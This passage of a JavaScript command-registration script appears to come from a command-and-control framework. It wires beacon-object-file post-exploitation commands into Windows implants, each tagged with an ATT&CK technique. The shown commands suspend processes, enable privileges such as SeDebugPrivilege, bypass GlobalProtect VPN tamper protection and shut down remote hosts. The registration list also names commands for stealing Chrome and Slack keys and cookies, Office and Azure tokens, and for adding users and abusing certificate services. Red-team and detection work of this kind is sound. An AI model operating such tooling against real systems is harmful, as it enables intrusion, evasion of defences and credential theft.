        `Requesting cert on behalf via CA '${parsed_json["ca"]}'`, "T1649");
});

// ── Privilege / Misc ─────────────────────────────────────────

// suspend
let suspend_cmd = ax.create_command(
    "suspend",
    "Suspend all threads in a process.",
    "suspend <pid>"
);
suspend_cmd.addArgInt("pid", true, "target process PID");
suspend_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("short,int", [1, parsed_json["pid"]]);
    execBof(id, cmdline, "suspend", args,
        `Suspending PID ${parsed_json["pid"]}`, "T1562");
});

// resume — uses the suspend BOF with flag 0
let resume_cmd = ax.create_command(
    "resume",
    "Resume all threads in a suspended process.",
    "resume <pid>"
);
resume_cmd.addArgInt("pid", true, "target process PID");
resume_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("short,int", [0, parsed_json["pid"]]);
    execBof(id, cmdline, "suspend", args,
        `Resuming PID ${parsed_json["pid"]}`, null);
});

// get_priv
let get_priv_cmd = ax.create_command(
    "get_priv",
    "Enable a Windows privilege for the current process token.",
    "get_priv <privilege>\n  e.g. SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege"
);
get_priv_cmd.addArgString("privilege", true, "privilege constant name");
get_priv_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("cstr", [parsed_json["privilege"]]);
    execBof(id, cmdline, "get_priv", args,
        `Enabling privilege ${parsed_json["privilege"]}`, "T1134.001");
});

// global_unprotect
let global_unprotect_cmd = ax.create_command(
    "global_unprotect",
    "Bypass GlobalProtect VPN tamper protection.",
    "global_unprotect"
);
global_unprotect_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    execBof(id, cmdline, "global_unprotect", null,
        "Running GlobalProtect unprotect BOF", "T1562.001");
});

// shutdown
let shutdown_cmd = ax.create_command(
    "shutdown",
    "Shut down or reboot a local or remote system.",
    "shutdown [hostname] [--message <msg>] [--timeout <seconds>] [--reboot] [--abort]"
);
shutdown_cmd.addArgString("hostname",      false, "target hostname (default: local)");
shutdown_cmd.addArgFlagString("--message", "message", false, "message shown before shutdown");
shutdown_cmd.addArgFlagInt("--timeout",    "timeout", false, "countdown in seconds (default: 0)");
shutdown_cmd.addArgBool("--reboot", "reboot instead of shutdown");
shutdown_cmd.addArgBool("--abort",  "abort a pending shutdown");
shutdown_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let reboot  = parsed_json["--reboot"] ? 1 : 0;
    let abort_f = parsed_json["--abort"]  ? 1 : 0;
    let args = ax.bof_pack("cstr,cstr,int,short,short",
        [parsed_json["hostname"] || "",
         parsed_json["message"]  || "",
         parsed_json["timeout"]  || 0,
         abort_f, reboot]);
    execBof(id, cmdline, "shutdown", args,
        `Initiating ${reboot ? "reboot" : "shutdown"} on ${parsed_json["hostname"] || "local"}`,
        "T1529");
});

// ── Registration ────────────────────────────────────────────

let group = ax.create_commands_group("TrustedSec-Remote-Ops", [
    sc_description_cmd, sc_config_cmd, sc_failure_cmd, sc_create_cmd,
    sc_delete_cmd, sc_stop_cmd, sc_start_cmd,
    reg_set_cmd, reg_delete_cmd, reg_export_cmd, reg_save_cmd,
    schtaskscreate_cmd, schtasksdelete_cmd, schtasksstop_cmd, schtasksrun_cmd,
    procdump_cmd, ProcessListHandles_cmd, ProcessDestroy_cmd,
    enableuser_cmd, setuserpass_cmd, addusertogroup_cmd, adduser_cmd, unexpireuser_cmd,
    chromeKey_cmd, slackKey_cmd, slack_cookie_cmd, shspawnas_cmd,
    office_tokens_cmd, get_azure_token_cmd, ask_mfa_cmd, make_token_cert_cmd,
    adcs_request_cmd, adcs_request_on_behalf_cmd,
    suspend_cmd, resume_cmd, get_priv_cmd, global_unprotect_cmd, shutdown_cmd
]);

ax.register_commands_group(group, ["beacon", "gopher", "kharon", "CrystalForge"], ["windows"], []);
